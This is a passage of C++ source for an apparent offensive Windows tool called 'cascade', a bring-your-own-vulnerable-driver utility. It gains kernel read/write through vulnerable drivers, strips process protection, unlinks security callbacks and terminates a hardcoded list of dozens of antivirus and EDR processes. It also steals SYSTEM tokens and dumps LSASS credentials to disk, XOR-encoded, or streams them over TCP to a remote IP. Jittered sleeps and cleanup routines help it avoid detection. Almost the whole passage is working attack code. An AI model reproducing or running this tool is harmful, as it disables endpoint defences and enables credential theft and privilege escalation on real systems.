    "SonicWallClientProtectionService.exe","swc_service.exe",
    // Sophos
    "hmpalert.exe","McsAgent.exe","McsClient.exe","SavApi.exe","SAVAdminService.exe",
    "SAVService.exe","SEDService.exe","SophosClean.exe","SophosHealth.exe",
    "SophosLiveQueryService.exe","SophosMTR.exe","SophosNetFilter.exe",
    "SophosNtpService.exe","SophosOsquery.exe","SophosUI.exe","SophosUpdateMgr.exe",
    // Tanium
    "TaniumClient.exe","TaniumCX.exe","tanclient.exe",
    // ThreatLocker
    "ThreatLockerConsent.exe","threatlockerservice.exe","threatlockertray.exe",
    // Trend Micro
    "coreFrameworkHost.exe","coreServiceShell.exe","NTRTScan.exe","ntrtscan.exe",
    "OfcService.exe","PccNTMon.exe","TMBMSRV.exe","TmListen.exe","TmPfw.exe",
    // Uptycs
    "VectorAgent.exe","UptycsAgent.exe",
    // WatchGuard
    "wlcsservice.exe",
    // Webroot
    "WRSA.exe","WRSkyClient.exe","WRSVC.exe",
    // Sysmon
    "Sysmon.exe","Sysmon64.exe",
    // Zscaler
    "zlclient.exe",
    nullptr
};

// Count processes still alive (for verify after kill)
static int CountRunning(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    int count = 0;
    if (Process32FirstW(snap, &pe)) do {
        char nm[MAX_PATH]{};
        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, nm, sizeof(nm), nullptr, nullptr);
        if (_stricmp(nm, name) == 0) count++;
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return count;
}

static void KillEdrs() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    int attempted = 0, killed = 0, denied = 0;
    if (Process32FirstW(snap, &pe)) do {
        char nm[MAX_PATH]{};
        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, nm, sizeof(nm), nullptr, nullptr);
        for (int i = 0; kEdrProcs[i]; i++) {
            if (_stricmp(nm, kEdrProcs[i]) == 0) {
                attempted++;
                HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (h) {
                    if (TerminateProcess(h, 1)) {
                        printf("[+] Killed %s (PID %lu)\n", nm, pe.th32ProcessID);
                        killed++;
                    } else {
                        printf("[-] TerminateProcess %s (PID %lu) failed (%lu) - PPL strip may have failed\n",
                               nm, pe.th32ProcessID, GetLastError());
                        denied++;
                    }
                    CloseHandle(h);
                } else {
                    printf("[-] OpenProcess %s (PID %lu) failed (%lu)\n",
                           nm, pe.th32ProcessID, GetLastError());
                    denied++;
                }
            }
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    printf("[*] %d EDR process(es) attempted: %d killed, %d denied\n", attempted, killed, denied);
    if (denied > 0)
        printf("[!] %d kill(s) denied - PPL strip likely failed or HVCI active\n", denied);
}

// Kill specific PID: strip PPL then terminate
static bool KillSpecificPid(QWORD sysEproc, DWORD pid) {
    char nm[16]{};
    QWORD ep = FindEprocessByPid(sysEproc, pid, nm);
    if (ep) {
        BYTE before = 0; KRead(ep + g_off.Protection, &before, 1);
        if (before != 0) {
            printf("[*] %s (PID %lu) Protection=0x%02X, stripping...\n", nm, pid, before);
            BYTE zero = 0;
            if (!KWrite(ep + g_off.Protection, &zero, 1)) {
                printf("[-] KWrite Protection failed\n");
            } else {
                BYTE after = 0xFF; KRead(ep + g_off.Protection, &after, 1);
                printf("[+] Protection cleared: 0x%02X -> 0x%02X\n", before, after);
            }
        }
    } else {
        printf("[!] PID %lu EPROCESS not found (may not have PPL)\n", pid);
    }

    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!h) { printf("[-] OpenProcess PID %lu failed (%lu)\n", pid, GetLastError()); return false; }
    if (!TerminateProcess(h, 1)) {
        printf("[-] TerminateProcess PID %lu failed (%lu)\n", pid, GetLastError());
        CloseHandle(h);
        return false;
    }
    CloseHandle(h);

    Sleep(300);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    bool still_alive = false;
    if (snap != INVALID_HANDLE_VALUE) {
        if (Process32FirstW(snap, &pe)) do {
            if (pe.th32ProcessID == pid) { still_alive = true; break; }
        } while (Process32NextW(snap, &pe));
        CloseHandle(snap);
    }
    if (still_alive) {
        printf("[-] PID %lu still alive after TerminateProcess\n", pid);
        return false;
    }
    printf("[+] PID %lu terminated and confirmed dead\n", pid);
    return true;
}

// ---------------------------------------------------------------------------
// Decode (XOR undo)
// ---------------------------------------------------------------------------
static bool DecodeFile(const char* inPath, const char* outPath, BYTE xorKey = 0x55) {
    HANDLE f = CreateFileA(inPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (f == INVALID_HANDLE_VALUE) { printf("[-] Open %s failed (%lu)\n", inPath, GetLastError()); return false; }
    DWORD sz = GetFileSize(f, nullptr);
    if (sz == INVALID_FILE_SIZE || sz == 0) { printf("[-] GetFileSize failed\n"); CloseHandle(f); return false; }
    BYTE* buf = (BYTE*)VirtualAlloc(nullptr, sz, MEM_COMMIT, PAGE_READWRITE);
    if (!buf) { printf("[-] VirtualAlloc failed\n"); CloseHandle(f); return false; }
    DWORD got = 0;
    ReadFile(f, buf, sz, &got, nullptr);
    CloseHandle(f);
    for (DWORD i = 0; i < sz; i++) buf[i] ^= xorKey;
    if (sz >= 4 && buf[0]=='M' && buf[1]=='D' && buf[2]=='M' && buf[3]=='P')
        printf("[+] MDMP signature OK\n");
    else
        printf("[!] MDMP signature not found\n");
    HANDLE o = CreateFileA(outPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    DWORD w = 0;
    WriteFile(o, buf, sz, &w, nullptr);
    CloseHandle(o);
    VirtualFree(buf, 0, MEM_RELEASE);
    printf("[+] Decoded to %s (%lu bytes)\n", outPath, sz);
    return true;
}

// ---------------------------------------------------------------------------
// Jittered sleep: base_ms +/- 40%
// ---------------------------------------------------------------------------
static void JitteredSleep(DWORD base_ms) {
    BYTE rnd = 0;
    HCRYPTPROV prov = 0;
    if (CryptAcquireContextW(&prov, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        CryptGenRandom(prov, 1, &rnd);
    if (prov) CryptReleaseContext(prov, 0);
    DWORD jitter = (DWORD)(base_ms * 0.4 * ((int)rnd - 128) / 128);
    Sleep(base_ms + jitter);
}

// ---------------------------------------------------------------------------
// List all processes from EPROCESS chain
// ---------------------------------------------------------------------------
static void ListProcs(QWORD sysEproc) {
    printf("%-8s  %-20s  %s\n", "PID", "Name", "Protection");
    printf("%-8s  %-20s  %s\n", "---", "----", "----------");
    QWORD head  = sysEproc + g_off.ActiveProcessLinks;
    QWORD flink = KReadQword(head);
    int guard = 0;
    while (flink && flink != head && guard++ < 10000) {
        QWORD ep  = flink - g_off.ActiveProcessLinks;
        QWORD pid = KReadQword(ep + g_off.UniqueProcessId);
        char nm[16]{};
        KRead(ep + g_off.ImageFileName, nm, 15); nm[15] = 0;
        BYTE prot = 0;
        KRead(ep + g_off.Protection, &prot, 1);
        if (prot)
            printf("%-8llu  %-20s  0x%02X (PPL)\n", pid, nm, prot);
        else
            printf("%-8llu  %-20s\n", pid, nm);
        flink = KReadQword(ep + g_off.ActiveProcessLinks);
    }
}

// ---------------------------------------------------------------------------
// Test R/W
// ---------------------------------------------------------------------------
static bool TestRw(QWORD sysEproc) {
    printf("[test] Reading System EPROCESS at 0x%llX\n", sysEproc);
    BYTE block[32]{};
    if (!KRead(sysEproc, block, sizeof(block))) {
        printf("[-] KRead System EPROCESS failed\n");
        return false;
    }
    printf("[+] KRead OK. First 16 bytes: ");
    for (int i = 0; i < 16; i++) printf("%02X ", block[i]);
    printf("\n");
    BYTE name[16]{};
    if (KRead(sysEproc + g_off.ImageFileName, name, 15))
        printf("[+] System EPROCESS ImageFileName: %s\n", (char*)name);
    QWORD pid4 = KReadQword(sysEproc + g_off.UniqueProcessId);
    printf("[+] System PID from EPROCESS: %llu (expect 4)\n", pid4);
    printf("[+] R/W test PASSED\n");
    return true;
}

// ---------------------------------------------------------------------------
// Driver init
// ---------------------------------------------------------------------------
static bool InitProvider(const Config& cfg) {
    HMODULE ntdll      = GetModuleHandleA("ntdll.dll");
    g_NtLoadDriver     = (NtLoadDriver_t)  GetProcAddress(ntdll, "NtLoadDriver");
    g_NtUnloadDriver   = (NtUnloadDriver_t)GetProcAddress(ntdll, "NtUnloadDriver");
    g_activeProvider   = cfg.type;

    if (cfg.type == ProviderType::PdfwKrnl) {
        g_pdfwDev = CreateFileW(L"\\\\.\\Global\\PdFwKrnl",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_pdfwDev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open PdFwKrnl (%lu)\n", GetLastError()); return false;
        }
        printf("[+] PdFwKrnl opened\n");
        return true;
    }

    if (cfg.drvPath.empty()) {
        printf("[-] --driver path required\n"); return false;
    }
    if (!EnablePrivilege(SE_LOAD_DRIVER_NAME)) {
        printf("[-] SeLoadDriverPrivilege not available\n"); return false;
    }

    std::wstring widePath = Utf8ToWide(cfg.drvPath);

    // Hash-verify BEFORE dropping to temp (fail early)
    if (!VerifyDriverHash(widePath, cfg.type, cfg.forceUnsafe)) {
        printf("[-] Driver hash verification failed. Aborting.\n");
        return false;
    }

    std::wstring dropped;
    if (!CopyDriverToTemp(widePath, dropped)) return false;

    printf("[*] Driver dropped to: %s\n", WideToUtf8(dropped).c_str());

    g_svcName  = SvcNameFromPath(dropped);
    g_regPath  = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + g_svcName;
    g_dropPath = dropped;

    if (!CreateDriverService(g_svcName, dropped)) return false;
    if (!LoadDriverViaNt(g_regPath)) {
        DeleteServiceKey(g_svcName);
        DeleteFileW(dropped.c_str());
        return false;
    }
    JitteredSleep(300);

    if (cfg.type == ProviderType::Ktapi) {
        g_ktapiDev = CreateFileW(L"\\\\.\\ktapi",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_ktapiDev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open \\\\.\\ktapi (%lu)\n", GetLastError()); return false;
        }
        printf("[+] ktapi device opened\n");
        printf("[*] Bootstrapping CR3 via PML4 self-ref scan (may take a moment)...\n");
        g_ktapiCr3 = Ktapi_FindCr3();
        if (!g_ktapiCr3) {
            printf("[-] CR3 bootstrap failed - ktapi VA->PA unavailable\n"); return false;
        }
        printf("[+] Kernel CR3: 0x%llX\n", g_ktapiCr3);
        return true;
    }

    // BiosTool
    std::wstring devPath = L"\\\\.\\" + g_svcName;
    g_biostoolDev = CreateFileW(devPath.c_str(),
        GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_biostoolDev == INVALID_HANDLE_VALUE) {
        g_biostoolDev = CreateFileW(L"\\\\.\\BiosToolCommonDriver",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    }
    if (g_biostoolDev == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open device %s (%lu)\n",
            WideToUtf8(devPath).c_str(), GetLastError());
        return false;
    }
    printf("[+] Device opened: %s\n", WideToUtf8(devPath).c_str());
    return true;
}

static void CleanupProvider() {
    if (g_biostoolDev != INVALID_HANDLE_VALUE) { CloseHandle(g_biostoolDev); g_biostoolDev = INVALID_HANDLE_VALUE; }
    if (g_pdfwDev     != INVALID_HANDLE_VALUE) { CloseHandle(g_pdfwDev);     g_pdfwDev     = INVALID_HANDLE_VALUE; }
    if (g_ktapiDev    != INVALID_HANDLE_VALUE) { CloseHandle(g_ktapiDev);    g_ktapiDev    = INVALID_HANDLE_VALUE; }
    if (!g_regPath.empty()) { UnloadDriverViaNt(g_regPath); DeleteServiceKey(g_svcName); }
    if (!g_dropPath.empty()) { JitteredSleep(500); DeleteFileW(g_dropPath.c_str()); }
}

// ---------------------------------------------------------------------------
// CLI
// ---------------------------------------------------------------------------
static void Usage(const char* prog) {
    printf(
        "cascade - consolidated BYOVD tool (BiosToolCommonDriver / ktapi / warp)\n\n"
        "usage: %s [options]\n"
        "  --driver PATH          path to vulnerable driver .sys\n"
        "  --driver-type TYPE     biostool (default), ktapi, pdfwkrnl\n"
        "  --pid N                target PID (default: lsass)\n\n"
        "Pre-flight checks:\n"
        "  --check-security       detect VBS/HVCI/Credential Guard and exit\n"
        "  --force-unsafe         proceed despite HVCI/CG warnings\n\n"
        "Recon (read-only):\n"
        "  --test-rw              verify kernel R/W works\n"
        "  --dry-run              resolve structures, write nothing\n"
        "  --list-callbacks       enumerate ObCallback registrations\n"
        "  --list-procs           enumerate processes from kernel EPROCESS chain\n\n"
        "PPL / token:\n"
        "  --ppl-strip --pid N    remove PPL from specific PID\n"
        "  --ppl-add   --pid N    add PPL (Protected/WinSystem) to PID\n"
        "  --priv-esc  [--pid N]  steal SYSTEM token (default: self)\n\n"
        "EDR kill:\n"
        "  --kill-edr             strip PPL + terminate all known AV/EDR (%d entries)\n"
        "  --kill-pid  --pid N    strip PPL + terminate specific PID\n\n"
        "Callbacks:\n"
        "  --patch-callbacks      unlink all ObCallback registrations\n\n"
        "Dump:\n"
        "  --dump-rpm  --out PATH    ReadProcessMemory dump (recommended)\n"
        "  --dump-tcp  RECV_IP PORT  disk-free TCP streaming dump\n"
        "  --dump-kernel --out PATH  CR3 physical read (no VM_READ handle)\n"
        "  --dump --out PATH         [deprecated: use --dump-rpm] MiniDumpWriteDump\n"
        "  --no-xor               raw output (with --dump)\n"
        "  --xor-key HEX          XOR key byte in hex (default: 55); applies to --dump and --decode\n"
        "  --decode --in P --out P  undo XOR, validate MDMP\n\n"
        "Cleanup:\n"
        "  --cleanup-only         force-unload driver and delete artifacts, then exit\n\n"
        "Common:\n"
        "  --verbose              show kernel addresses and extended debug output\n"
        "  --help\n",
        prog, []{ int n=0; for(const char**p=kEdrProcs;*p;p++) n++; return n; }());
}

int main(int argc, char** argv) {
    Config cfg;
    for (int i = 1; i < argc; i++) {
        std::string a = argv[i];
        auto next = [&]() -> const char* { return (i + 1 < argc) ? argv[++i] : ""; };
        if (a == "--help" || a == "-h")         { Usage(argv[0]); return 0; }
        else if (a == "--driver")               cfg.drvPath    = next();
        else if (a == "--out")                  cfg.outPath    = next();
        else if (a == "--in")                   cfg.inPath     = next();
        else if (a == "--pid")                  cfg.targetPid  = (DWORD)atol(next());
        else if (a == "--driver-type") {
            std::string t = next();
            if (t == "biostool")               cfg.type = ProviderType::BiosTool;
            else if (t == "ktapi")             cfg.type = ProviderType::Ktapi;
            else if (t == "pdfwkrnl")          cfg.type = ProviderType::PdfwKrnl;
            else { printf("[-] Unknown driver-type: %s\n", t.c_str()); return 2; }
        }
        else if (a == "--dry-run")              cfg.dryRun           = true;
        else if (a == "--test-rw")              cfg.testRw           = true;
        else if (a == "--priv-esc")             cfg.doPrivEsc        = true;
        else if (a == "--kill-edr")             cfg.killEdr          = true;
        else if (a == "--kill-pid")             cfg.doKillPid        = true;
        else if (a == "--ppl-strip")            cfg.doPplStrip       = true;
        else if (a == "--ppl-add")              cfg.doPplAdd         = true;
        else if (a == "--dump")                 cfg.doDump           = true;
        else if (a == "--dump-rpm")             cfg.doDumpRpm        = true;
        else if (a == "--dump-kernel")          cfg.doDumpKernel     = true;
        else if (a == "--dump-tcp") {
            cfg.doDumpTcp = true;
            cfg.recvIp    = next();
            cfg.recvPort  = atoi(next());
        }
        else if (a == "--patch-callbacks")      cfg.doPatchCallbacks = true;
        else if (a == "--list-callbacks")       cfg.doListCallbacks  = true;
        else if (a == "--list-procs")           cfg.doListProcs      = true;
        else if (a == "--decode")               cfg.doDecode         = true;
        else if (a == "--no-xor")               cfg.noXor            = true;
        else if (a == "--verbose")              cfg.verbose          = true;
        else if (a == "--check-security")       cfg.doCheckSecurity  = true;
        else if (a == "--cleanup-only")         cfg.doCleanupOnly    = true;
        else if (a == "--force-unsafe")         cfg.forceUnsafe      = true;
        else if (a == "--xor-key") {

            const char* kstr = next();
            unsigned long kval = strtoul(kstr, nullptr, 16);
            cfg.xorKey = (BYTE)(kval & 0xFF);
        }
        else { printf("[-] Unknown arg: %s\n", a.c_str()); Usage(argv[0]); return 2; }
    }

    if (cfg.verbose) g_verbose = true;

    // Handle --check-security first (no driver needed)
    if (cfg.doCheckSecurity) {
        SecurityStatus sec = CheckSecurityFeatures();
        PrintSecurityStatus(sec);
        if (sec.hvciEnabled || sec.credGuardEnabled) {
            return 1;  // Exit with error if dangerous features active
        }
        return 0;
    }

    if (cfg.doDecode) {

        if (cfg.inPath.empty() || cfg.outPath.empty()) {
            printf("[-] --decode needs --in and --out\n"); return 2;
        }
        return DecodeFile(cfg.inPath.c_str(), cfg.outPath.c_str(), cfg.xorKey) ? 0 : 1;
    }

    DWORD build = GetWindowsBuild();
    printf("[*] Windows build: %lu\n", build);
    SetOffsetsByBuild(build);

    // Handle --cleanup-only: attempt to unload any leftover driver artifacts
    if (cfg.doCleanupOnly) {
        printf("[*] Cleanup-only mode: attempting to remove driver artifacts...\n");
        // Try common service names
        const wchar_t* svcNames[] = {
            L"BiosToolCommonDriver", L"ktapi", L"PdFwKrnl",
            L"BiosTool_", nullptr  // prefix for pid-based names
        };
        for (int i = 0; svcNames[i]; i++) {
            std::wstring svc = svcNames[i];
            std::wstring regPath = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + svc;
            UNICODE_STRING_W us{};
            us.Buffer = (LPWSTR)regPath.c_str();
            us.Length = (USHORT)(regPath.size() * sizeof(wchar_t));
            us.MaximumLength = us.Length + sizeof(wchar_t);
            NTSTATUS st = g_NtUnloadDriver(&us);
            if (NT_SUCCESS(st)) {
                printf("[+] Unloaded %ls\n", svc.c_str());
            }
            DeleteServiceKey(svc);
        }
        // Clean temp dir
        wchar_t tempDir[MAX_PATH]{};
        GetTempPathW(MAX_PATH, tempDir);
        WIN32_FIND_DATAW fd;
        std::wstring pattern = std::wstring(tempDir) + L"*.sys";
        HANDLE hFind = FindFirstFileW(pattern.c_str(), &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                std::wstring path = std::wstring(tempDir) + fd.cFileName;
                if (DeleteFileW(path.c_str())) {
                    printf("[+] Deleted %ls\n", fd.cFileName);
                }
            } while (FindNextFileW(hFind, &fd));
            FindClose(hFind);
        }
        printf("[*] Cleanup complete\n");
        return 0;
    }

    // Pre-flight security check for dangerous operations
    bool isDangerousOp = cfg.doDump || cfg.doDumpRpm || cfg.doDumpKernel ||
                         cfg.doDumpTcp || cfg.killEdr || cfg.doPatchCallbacks;
    if (isDangerousOp && !cfg.forceUnsafe) {
        SecurityStatus sec = CheckSecurityFeatures();
        if (sec.hvciEnabled) {
            printf("\n[!!!] HVCI is ACTIVE - kernel writes will likely BSOD the system.\n");
            printf("      Use --force-unsafe to proceed anyway, or disable HVCI first.\n\n");
            return 1;
        }
        if (sec.credGuardEnabled && (cfg.doDump || cfg.doDumpRpm || cfg.doDumpKernel || cfg.doDumpTcp)) {
            printf("\n[!!!] Credential Guard is ACTIVE - LSASS dump will be EMPTY.\n");
            printf("      Secrets are isolated in VBS; dumping is pointless.\n");
            printf("      Use --force-unsafe to proceed anyway.\n\n");
            return 1;
        }
        if (sec.driverBlocklistOn) {
            printf("[!] Driver blocklist enabled - vulnerable driver may fail to load.\n");
        }
    }

    if (!InitProvider(cfg)) return 1;


    KernelBase kb = GetKernelBase();
    if (!kb.ntosBase || !kb.systemEproc) {
        printf("[-] Failed to locate ntoskrnl base or System EPROCESS\n");
        CleanupProvider(); return 1;
    }
    if (g_verbose) {
        printf("[*] ntoskrnl: 0x%llX\n", kb.ntosBase);
        printf("[+] System EPROCESS: 0x%llX\n", kb.systemEproc);
    }

    int ret = 0;

    if (cfg.testRw) {
        if (!TestRw(kb.systemEproc)) ret = 1;
        CleanupProvider(); return ret;
    }

    if (cfg.doListCallbacks) {
        if (!ListCallbacks(kb.ntosBase)) ret = 1;
    }

    if (cfg.doListProcs) {
        ListProcs(kb.systemEproc);
    }

    // Resolve LSASS PID for dump modes
    DWORD pid = cfg.targetPid;
    if (!pid && (cfg.doDump || cfg.doDumpRpm || cfg.doDumpKernel ||
                 cfg.doDumpTcp || cfg.dryRun)) {
        pid = FindPidByName("lsass.exe");
        if (!pid) { printf("[-] Cannot find lsass.exe; use --pid\n"); CleanupProvider(); return 1; }
        printf("[*] LSASS PID: %lu\n", pid);
    }

    if (cfg.doPplStrip) {
        DWORD tpid = cfg.targetPid;
        if (!tpid) { printf("[-] --ppl-strip requires --pid\n"); CleanupProvider(); return 2; }
        PplResult r = StripPpl(kb.systemEproc, tpid, false);
        if (!r.ok) ret = 1;
    }

    if (cfg.doPplAdd) {
        DWORD tpid = cfg.targetPid;
        if (!tpid) { printf("[-] --ppl-add requires --pid\n"); CleanupProvider(); return 2; }
        if (!PplAdd(kb.systemEproc, tpid)) ret = 1;
    }

    if (cfg.killEdr) {
        printf("[*] Patching ObCallbacks before EDR kill...\n");
        PatchObCallbacks(kb.ntosBase);
        // Walk EPROCESS list for PPL processes and strip all
        printf("[*] Stripping PPL from all running processes...\n");
        QWORD head  = kb.systemEproc + g_off.ActiveProcessLinks;
        QWORD flink = KReadQword(head);
        int stripped = 0;
        int guard = 0;
        while (flink && flink != head && guard++ < 10000) {
            QWORD ep = flink - g_off.ActiveProcessLinks;
            BYTE prot = 0;
            KRead(ep + g_off.Protection, &prot, 1);
            if (prot > 0) {
                char nm[16]{};
                KRead(ep + g_off.ImageFileName, nm, 15);
                BYTE zero = 0;
                if (KWrite(ep + g_off.Protection, &zero, 1)) {
                    BYTE verify = 0xFF; KRead(ep + g_off.Protection, &verify, 1);
                    printf("[+] PPL stripped: %-20s Protection 0x%02X -> 0x%02X\n", nm, prot, verify);
                    stripped++;
                }
            }
            flink = KReadQword(ep + g_off.ActiveProcessLinks);
        }
        printf("[*] %d PPL processes stripped\n", stripped);
        KillEdrs();
    }

    if (cfg.doKillPid) {
        DWORD tpid = cfg.targetPid;
        if (!tpid) { printf("[-] --kill-pid requires --pid\n"); CleanupProvider(); return 2; }
        if (!KillSpecificPid(kb.systemEproc, tpid)) ret = 1;
    }

    if (cfg.doPatchCallbacks) {
        printf("[*] Patching Defender ObCallback registrations...\n");
        if (!PatchObCallbacks(kb.ntosBase)) ret = 1;
    }

    if (cfg.doPrivEsc) {
        DWORD tpid = cfg.targetPid ? cfg.targetPid : GetCurrentProcessId();
        printf("[*] Stealing SYSTEM token for PID %lu%s\n",
               tpid, cfg.targetPid ? "" : " (self)");
        if (!TokenSteal(kb.systemEproc, tpid)) ret = 1;
    }

    if (cfg.dryRun) {
        if (!pid) { printf("[-] --dry-run requires target PID\n"); CleanupProvider(); return 2; }
        PplResult r = StripPpl(kb.systemEproc, pid, true);
        if (!r.ok) ret = 1;
        else printf("\n[dry-run] OK. Run with --dump-rpm --out <path> to execute.\n");
    }

    if (cfg.doDump) {
        if (cfg.outPath.empty()) { printf("[-] --dump needs --out\n"); CleanupProvider(); return 2; }
        printf("[*] Auto-patching ObCallbacks for dump...\n");
        PatchObCallbacks(kb.ntosBase);
        // Read current protection state before clearing
        QWORD lsassEp = FindEprocessByPid(kb.systemEproc, pid, nullptr);
        BYTE savedProt = 0, savedSig = 0, savedSecSig = 0;
        if (lsassEp) {
            KRead(lsassEp + g_off.Protection - 2, &savedSig,    1);
            KRead(lsassEp + g_off.Protection - 1, &savedSecSig, 1);
            KRead(lsassEp + g_off.Protection,     &savedProt,   1);
        }
        PplResult r = StripPpl(kb.systemEproc, pid, false, true);
        if (!r.ok) { CleanupProvider(); return 1; }
        bool ok = DumpLsass(pid, cfg.outPath.c_str(), cfg.noXor, cfg.xorKey);
        // Restore protection
        if (lsassEp && savedProt) RestorePpl(lsassEp, savedProt, savedSig, savedSecSig);
        if (!ok) ret = 1;
    }

    if (cfg.doDumpRpm) {
        if (cfg.outPath.empty()) { printf("[-] --dump-rpm needs --out\n"); CleanupProvider(); return 2; }
        DWORD rpid = pid ? pid : FindPidByName("lsass.exe");
        if (!rpid) { printf("[-] Cannot find lsass.exe\n"); CleanupProvider(); return 1; }
        printf("[*] Auto-patching ObCallbacks for RPM dump...\n");
        PatchObCallbacks(kb.ntosBase);
        if (!DumpRpm(rpid, cfg.outPath.c_str())) ret = 1;
    }

    if (cfg.doDumpTcp) {
        if (cfg.recvIp.empty()) { printf("[-] --dump-tcp needs RECV_IP PORT\n"); CleanupProvider(); return 2; }
        DWORD rpid = pid ? pid : FindPidByName("lsass.exe");
        if (!rpid) { printf("[-] Cannot find lsass.exe\n"); CleanupProvider(); return 1; }
        printf("[*] Auto-patching ObCallbacks for TCP dump...\n");
        PatchObCallbacks(kb.ntosBase);
        if (!DumpRpmTcp(rpid, cfg.recvIp.c_str(), cfg.recvPort)) ret = 1;
    }

    if (cfg.doDumpKernel) {
        if (cfg.outPath.empty()) { printf("[-] --dump-kernel needs --out\n"); CleanupProvider(); return 2; }
        DWORD kpid = pid ? pid : FindPidByName("lsass.exe");
        if (!kpid) { printf("[-] Cannot find lsass.exe\n"); CleanupProvider(); return 1; }
        if (!DumpKernel(kb.systemEproc, kpid, cfg.outPath.c_str())) ret = 1;
    }

    CleanupProvider();
    return ret;
}
